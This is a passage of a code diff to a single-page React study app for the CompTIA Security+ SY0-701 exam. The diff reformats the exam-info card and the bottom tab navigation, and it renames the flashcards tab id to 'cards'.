-        {[["Version", "SY0-701 (Current)"], ["Questions", "Max 90 (MCQ + PBQ)"], ["Time", "90 minutes"], ["Passing Score", "750 / 900 (83%)"], ["Valid Until", "~Fall 2026"]].map(([k, v]) => (
-          <div key={k} style={{ display: "flex", justifyContent: "space-between", paddingBottom: 8, marginBottom: 8, borderBottom: "1px solid #0f1929" }}>
-            <span style={{ fontSize: 13, color: "#475569" }}>{k}</span>
-            <span style={{ fontSize: 13, color: "#94a3b8", fontWeight: 600 }}>{v}</span>
+      <div style={{...C.card,background:"#0a0d1a",borderColor:"#1a1e2e"}}>
+        <div style={{fontSize:11,color:"#475569",letterSpacing:1,textTransform:"uppercase",marginBottom:12}}>Exam Info</div>
+        {[["Version","SY0-701 (Current — until ~Fall 2026)"],["Questions","Max 90 (MCQ + PBQ)"],["Time","90 minutes"],["Passing Score","750 / 900 (83%)"],["Domains","5 domains"]].map(([k,v])=>(
+          <div key={k} style={{display:"flex",justifyContent:"space-between",paddingBottom:8,marginBottom:8,borderBottom:"1px solid #0f1929"}}>
+            <span style={{fontSize:13,color:"#475569"}}>{k}</span>
+            <span style={{fontSize:12,color:"#94a3b8",fontWeight:600}}>{v}</span>
           </div>
         ))}
       </div>
@@ -571,41 +759,33 @@ function Home() {
   );
 }
 
-// ─── APP ──────────────────────────────────────────────────────────────────────
+// ── APP ───────────────────────────────────────────────────────────────────────
+const TABS=[{id:"home",icon:"🏠",label:"Home"},{id:"cards",icon:"🃏",label:"Cards"},{id:"quiz",icon:"🎯",label:"Quiz"},{id:"match",icon:"🧩",label:"Match"},{id:"games",icon:"🕹️",label:"Games"}];
 
-const TABS = [
-  { id: "home", icon: "🏠", label: "Home" },
-  { id: "flashcards", icon: "🃏", label: "Cards" },
-  { id: "quiz", icon: "🎯", label: "Quiz" },
-  { id: "match", icon: "🧩", label: "Match" },
-  { id: "games", icon: "🕹️", label: "Games" },
-];
-
-function App() {
-  const [tab, setTab] = useState("home");
-  return (
-    <div style={{ fontFamily: "'DM Sans', sans-serif", background: "#050d18", minHeight: "100vh", color: "#e2e8f0", display: "flex", flexDirection: "column", maxWidth: 480, margin: "0 auto", position: "relative" }}>
-      <div style={{ flex: 1 }}>
-        {tab === "home" && <Home />}
-        {tab === "flashcards" && <Flashcards />}
-        {tab === "quiz" && <Quiz />}
-        {tab === "match" && <Match />}
-        {tab === "games" && <Games />}
+function App(){
+  const [tab,setTab]=useState("home");
+  return(
+    <div style={{fontFamily:"'DM Sans',sans-serif",background:"#050d18",minHeight:"100vh",color:"#e2e8f0",display:"flex",flexDirection:"column",maxWidth:480,margin:"0 auto",position:"relative"}}>
+      <div style={{flex:1}}>
+        {tab==="home"&&<Home/>}
+        {tab==="cards"&&<Flashcards/>}
+        {tab==="quiz"&&<Quiz/>}
+        {tab==="match"&&<Match/>}
+        {tab==="games"&&<Games/>}
       </div>
-      <div style={{ position: "fixed", bottom: 0, left: "50%", transform: "translateX(-50%)", width: "100%", maxWidth: 480, background: "#080f1a", borderTop: "1px solid #1e293b", display: "flex", paddingBottom: "env(safe-area-inset-bottom, 8px)", zIndex: 100 }}>
-        {TABS.map(t => (
-          <button key={t.id} onClick={() => setTab(t.id)} style={{ flex: 1, background: "transparent", border: "none", cursor: "pointer", padding: "10px 4px 8px", display: "flex", flexDirection: "column", alignItems: "center", gap: 3, fontFamily: "inherit" }}>
-            <span style={{ fontSize: 20 }}>{t.icon}</span>
-            <span style={{ fontSize: 10, color: tab === t.id ? "#00d4ff" : "#334155", fontWeight: tab === t.id ? 700 : 400 }}>{t.label}</span>
-            {tab === t.id && <div style={{ width: 4, height: 4, borderRadius: "50%", background: "#00d4ff" }} />}
+      <div style={{position:"fixed",bottom:0,left:"50%",transform:"translateX(-50%)",width:"100%",maxWidth:480,background:"#080f1a",borderTop:"1px solid #1e293b",display:"flex",paddingBottom:"env(safe-area-inset-bottom,8px)",zIndex:100}}>
+        {TABS.map(t=>(
+          <button key={t.id} onClick={()=>setTab(t.id)} style={{flex:1,background:"transparent",border:"none",cursor:"pointer",padding:"10px 4px 8px",display:"flex",flexDirection:"column",alignItems:"center",gap:3,fontFamily:"inherit"}}>
+            <span style={{fontSize:20}}>{t.icon}</span>
+            <span style={{fontSize:10,color:tab===t.id?"#00d4ff":"#334155",fontWeight:tab===t.id?700:400}}>{t.label}</span>
+            {tab===t.id&&<div style={{width:4,height:4,borderRadius:"50%",background:"#00d4ff"}}/>}
           </button>
         ))}
       </div>
     </div>
   );
 }
-
-ReactDOM.createRoot(document.getElementById('root')).render(<App />);
+ReactDOM.createRoot(document.getElementById("root")).render(<App/>);
 </script>
 </body>
 </html>
